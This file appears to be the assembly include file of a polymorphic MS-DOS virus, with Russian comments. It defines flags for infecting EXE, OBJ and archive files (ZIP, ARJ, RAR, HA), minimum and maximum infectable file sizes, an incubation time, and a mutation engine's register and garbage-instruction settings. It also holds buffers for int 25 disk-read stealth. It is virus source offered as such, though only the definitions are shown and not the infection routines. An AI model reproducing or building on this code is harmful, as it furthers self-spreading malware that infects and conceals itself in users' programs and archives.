.286
%NOINCL
%NOSYMS
.SFCOND
.XCREF
.SALL

locals
USE_PUSHA equ 0
;RELIZ equ 0
;USE_BEEP equ 0

$BEEP$ macro
IFDEF USE_BEEP
extrn beep:near
call beep
ENDIF
endm
;───────────────────────────────────────────────────────────────────────────
INCLUDE SF.INC      ;\
INCLUDE FIND.INC    ;|
INCLUDE EXE.INC     ;> из исходников MS-DOS 3.30
INCLUDE PDB.INC     ;|
INCLUDE DPB.INC     ;|
INCLUDE DIRENT.INC  ;|
INCLUDE ARENA.INC   ;/
;───────────────────────────────────────────────────────────────────────────
INCLUDE STAR14T.INC
INCLUDE ABSDISK.INC
INCLUDE ARXHDRS.ASI
INCLUDE SHMAC.INC
INCLUDE CRC.ASI
;───────────────────────────────────────────────────────────────────────────
GLOBAL      RND_INIT:near,                  \
            RND_GET:near,                   \ randomizer
            RND_GET_THREE_BITS:near,        \
            RND_GET_BYTE:near
;───────────────────────────────────────────────────────────────────────────
;───────────────────────────────────────────────────────────────────────────
RegWord         ENUM    R_AX, R_CX, R_DX, R_BX, R_SP, R_BP, R_SI, R_DI
RegByte         ENUM    R_AL, R_CL, R_DL, R_BL, R_AH, R_CH, R_DH, R_BH

secondbyte      RECORD  M0D:2, REG:3, R_M:3

asgrbl  RECORD  N               :1,     \
                REG_GARBL3      :1,     \ регистры
                REG_GARBL2      :1,     \ не используемые
                REG_GARBL1      :1,     \ для расшифровки
                REG_TMP2        :1,     \   для констант
                REG_TMP1        :1,     \
                REG_ENC         :1,     \
                REG_INDEX       :1      ; указатель на шифруемое слово

REG_GARBL_ALL = MASK REG_GARBL1   or    \ регистры
                MASK REG_GARBL2   or    \   не используемые
                MASK REG_GARBL3         ;     для расшифровки
REG_ENC_ALL   = MASK REG_ENC      or    \ регистры
                MASK REG_TMP1     or    \   используемые
                MASK REG_TMP2           ;     для расшифровки
REG_ALL       = MASK REG_INDEX    or    \ все регистры (кроме SP)
                REG_ENC_ALL       or    \
                REG_GARBL_ALL           ;
;─current─not─used──────────────────────────────────────────────────────────
ENFLAGS RECORD  EN_SAVE_REGS    :1,     \ сохранять регистры перед расшифровкой
                EN_USE_INT      :1,     \ енкодить прерывания
                EN_USE_CALL     :1,     \ енкодить процедуры и JMP near
                EN_USE_JMPS     :1,     \ енкодить условные переходы
                EN_INT_GARBL    :1,     \ мало левых инструкций в расшифровщике
                EN_RELOCATOR    :1,     \ определять свое положение в памяти
                EN_BFR_GARBL    :2      ; уровень левых инструкций перед  расшифровщиком
                                            ; ^ если 0 - то не генерить
;───────────────────────────────────────────────────────────────────────────

ENFLAGS_ARX =   MASK EN_RELOCATOR   or  \
                MASK EN_USE_INT     or  \
                MASK EN_USE_JMPS    or  \
                MASK EN_USE_CALL    or  \
                (3 shl  EN_BFR_GARBL)   ;

;───────────────────────────────────────────────────────────────────────────
;флаги для вируса в EXEфайле
ENFLAGS_EXE =   MASK EN_USE_INT     or  \
                MASK EN_USE_JMPS    or  \
                MASK EN_USE_CALL    or  \
                (3 shl  EN_BFR_GARBL)   ;
;───────────────────────────────────────────────────────────────────────────
ENFLAGS_HDR =   MASK EN_INT_GARBL   or  \
                MASK EN_RELOCATOR   or  \
                MASK EN_SAVE_REGS
;───────────────────────────────────────────────────────────────────────────
;флаги для вируса в EXEфайле c podgruzkoi
ENFLAGS_IXE =   MASK EN_USE_JMPS    or  \
                MASK EN_USE_CALL    or  \
                MASK EN_RELOCATOR   or  \
                MASK EN_SAVE_REGS   or  \
                (2 shl  EN_BFR_GARBL)   ;
;───────────────────────────────────────────────────────────────────────────
;флаги для вируса в OBJфайле
ENFLAGS_OBJ =   MASK EN_INT_GARBL   or  \
                MASK EN_SAVE_REGS   or  \
                MASK EN_USE_CALL    or  \
                MASK EN_RELOCATOR   or  \
                (1 shl  EN_BFR_GARBL)   ;
;───────────────────────────────────────────────────────────────────────────
;флаги для вируса в OBJфайле
;ENFLAGS_OBJ =   MASK EN_INT_GARBL   or  \
;                MASK EN_SAVE_REGS   or  \
;                MASK EN_RELOCATOR
;───────────────────────────────────────────────────────────────────────────
;опкоды
opNOP           equ 90h
opPUSHF         equ 9Ch
opINT           equ 0CDh
opCALL          equ 0E8h
opJMPN          equ 0E9h
opJMPS          equ 0EBh
opSEGCS         equ 2Eh
opSEGES         equ 26h
opRETN          equ 0C3h
opRETF          equ 0CBh
opJMPFAR        equ 0EAh
opMOV_AHimm     equ 0B4h
opPUSH_CS       equ 0Eh
opPUSHA         equ 60h
opPOPA          equ 61h
opJC            equ 72h
opJZ            equ 74h
opPOP_AX        equ 58h
opPUSH_AX       equ 50h
opCMP_AXimm     equ 3Dh
opCMP_ALimm     equ 3Ch
;───────────────────────────────────────────────────────────────────────────
;минимальный и максимальный размеры заражаемых EXEшников
MININFECTSIZE   equ 400h   ;  1k
MAXINFECTSIZE   equ 80000h ;512k
;───────────────────────────────────────────────────────────────────────────
INTERVAL_INFECT = 2
INCUB_TIME      = 3 ;14 sec

VIRUSSTACKSIZE  equ 0D0h
TIMEMARKER      equ 1
SIZEMARKER      equ 157d
SIZEMARKER_MOD  equ 37d
CRYPTLEVEL      equ 50h   ;максимально возможный (!)
DOUBLEENCRYPT   equ 80h
HDRCRYPTLEVEL   equ 4Fh
EXECRYPTLEVEL   equ 23h ;+DOUBLEENCRYPT
IXECRYPTLEVEL   equ 29h
ARXCRYPTLEVEL   equ 27h+DOUBLEENCRYPT
OBJCRYPTLEVEL   equ 1Fh
IRP EXT, <ARX,EXE,IXE,OBJ,HDR>
    zmefl&EXT        equ (&EXT&CRYPTLEVEL shl 8) or ENFLAGS_&EXT
ENDM
UNINIT          equ 1111h
ZIP_SIGN = 4B50h
ARJ_SIGN = 60000d
RAR_SIGN = 6152h
HA_METHOD_STORED = 20H
ARJ_METHOD_STORED = 0
ZIP_METHOD_STORED = 0
RAR_METHOD_STORED = 30h
ZIP_LCL_ID = 403h
ZIP_CNL_ID = 201h
ZIP_END_ID = 605h
CRLF equ <0Dh,0Ah>
;───────────────────────────────────────────────────────────────────────────
;dword_shit struc
;       lo   dw ?
;       hi   dw ?
;ends
dword_shit struc
    union
        lo      dw  ?
        struc
            l       db  ?
            h       db  ?
        ends
    ends
    hi      dw  ?
ends

;───────────────────────────────────────────────────────────────────────────
ifInfJump macro whatest, execut
extrn IfInfect&whatest:near
;    lea     di, execut
    call    IfInfect&whatest
endm
;───────────────────────────────────────────────────────────────────────────
probability_test macro variabl, glb_pr, go_to
local __1
extrn variabl:byte
    call    RND_GET_BYTE
    cmp     ah, byte ptr ds:[variabl]
    jae __1
    cmp     al, glb_pr
__1:
    jae go_to
endm
prALWAYS =  -1

;───────────────────────────────────────────────────────────────────────────
ENGBUFFER   STRUC                           ;
            UNION
                STRUC                           ;
                    zmeflags        ENFLAGS ?
                    cur_cryptlevel  db      ?
                ENDS
                zmefl               dw      ?
            ENDS
            datasize                dw      ?
            jmp_after_decrypt       dw      ?
            targetptr               dw      ?
            segm_IDT                db      ?
            cJMP_patch              dw      ?
            nJMP_patch              dw      ?
            begin_sub               dw      ?
            end_of_jmp              dw      ?
            start_reg2              dw      ?
            start_reg3              dw      ?
            loop_top                dw      ?
            lastgarble              db      ?
            lastchoose              db      ?
            decryptor_size          dw      ?
            relocator_base          dw      ?
            reloff_1                dw      ?
            reloff_2                dw      ?
            value_J                 dw      ?
            value_X                 dw      ?
            value_Y                 dw      ?
            useregs                 asgrbl  ?
            IRPC NR, 0123456
                reg&NR              RegWord ?
            ENDM
ENDS
;───────────────────────────────────────────────────────────────────────────

;all_memory_size_p=400h ;16k in memory :)
all_memory_size_p=700h ;20k in memory :(
HDRBUFSIZE = 22h
hp equ (bp-80h)


WORKBUFFER  STRUC
        UNION
            STRUC ;infect ARX
                _arx_crc            dd  ?           ; CRC добавляемого в архив файла
                _fnamestr           db  12d dup (?) ; имя добавляемого в архив файла
                _hafcount           dw  ?
            ENDS
            STRUC ;infect OMF
                _siz98              dw  ?
                _posA0              dd  ?
                _sizA0              dw  ?
                _lib_dict_offset    dw  ?
            ENDS
            STRUC
                UNION
                    STRUC ;func 4B
                        _load_fname dw  ?
                        _load_array dw  ?
                    ENDS
                    STRUC ;func 3F
                        _rd_st_cnt  dw  ?
                        _st_rd_off  dw  ?
                        _beg_pos_lo dw  ?
                    ENDS
                ENDS
                UNION
                    _saved_seek     dd  ?  ;for restore header etc
                    STRUC ;stealth int25
                        _start_sec      dd  ?
                        _abs_read_drive db  ? ; диск, кот-й читали через int 25
                    ENDS
                ENDS
            ENDS
         ENDS
        _host_arx_date              dw  ?    ; дфта заражаемого файла
        _host_arx_time              dw  ?    ; дфта заражаемого файла
        _beg_pos                    dd  ?   ;use in "f_insert"
        _pos98                      dd  ?
        _fisize                     dw  ?
        _fioff                      dw  ?
        _fnamesize                  dw  ?
        _crthdr                     db  40h dup (?)
        _last_infect_time           dw  ?
        _hook                       dw  ?
        _close_on_error             db  ?   ;if 1, doserror-> close file
        _save_sp                    dw  ?
        _save_ss                    dw  ?
        _after_goto                 dw  ?
        _five_bytes                 db  5 dup (?)
        _turn_name_crc              dw  ?
        _engdata                    ENGBUFFER   ?
        _exehdr                     db  HDRBUFSIZE dup (?)
;        _dataencriptor              dd      CRYPTLEVEL dup (?)
;        _for_ret                    db      ?

ENDS
_hahdr         equ _exehdr
_ziphdr        equ _exehdr
_arjhdr        equ _exehdr
_rarhdr        equ _exehdr
_objhdr        equ _exehdr
_libhdr        equ _exehdr
_sfxhdr        equ _exehdr
_shift_buffer  equ _exehdr


To_hp MACRO some_label
    some_label equ   (hp+_&some_label&)
ENDM

To_hp   host_arx_date
To_hp   host_arx_time
To_hp   hook
To_hp   last_infect_time
To_hp   close_on_error
To_hp   after_goto
To_hp   lib_dict_offset
To_hp   hafcount
To_hp   saved_seek
To_hp   start_sec
To_hp   abs_read_drive
To_hp   beg_pos
To_hp   arx_crc
To_hp   load_fname
To_hp   load_array
To_hp   rd_st_cnt
To_hp   st_rd_off
To_hp   beg_pos_lo
To_hp   fnamestr
To_hp   pos98
To_hp   siz98
To_hp   posA0
To_hp   sizA0
To_hp   fisize
To_hp   fioff
To_hp   fnamesize
To_hp   engdata
To_hp   crthdr
To_hp   exehdr
To_hp   save_sp
To_hp   save_ss
To_hp   five_bytes
To_hp   turn_name_crc
To_hp   hahdr
To_hp   ziphdr
To_hp   arjhdr
To_hp   rarhdr
To_hp   objhdr
To_hp   libhdr
To_hp   sfxhdr
To_hp   shift_buffer

PURGE To_hp


















